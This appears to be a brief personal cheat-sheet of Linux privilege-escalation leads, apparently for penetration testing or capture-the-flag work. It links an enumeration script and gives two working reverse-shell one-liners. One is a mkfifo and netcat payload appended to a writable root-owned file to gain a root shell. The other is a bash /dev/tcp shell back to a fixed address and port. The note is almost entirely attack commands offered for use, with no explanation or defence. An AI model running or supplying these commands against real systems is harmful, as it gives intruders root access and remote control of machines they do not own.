
linux privilege-escalation leads
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

writable files with root ownership -> reverse root shell
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f' | tee -a <file>
```

/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.86/8443 0>&1'